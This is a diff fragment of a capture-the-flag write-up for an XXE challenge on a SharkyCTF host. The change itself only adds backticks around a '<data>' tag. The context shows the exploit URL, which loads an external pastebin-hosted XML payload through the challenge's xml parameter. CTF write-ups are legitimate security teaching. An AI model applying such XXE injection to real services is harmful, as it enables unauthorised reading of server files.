@@ -46,7 +46,7 @@ The goal is to inject the xxe via an external link in the url. I then created a 
 
 and include it `http://xxexternalxx.sharkyctf.xyz/?xml=https://pastebin.com/raw/5c3Daj3j` to get the flag !
 
-It was a basic XXE injection, the only "difficult" point was to find the <data> tag. Otherwise, nothing is displayed.
+It was a basic XXE injection, the only "difficult" point was to find the `<data>` tag. Otherwise, nothing is displayed.
 
 ## Flag 
 
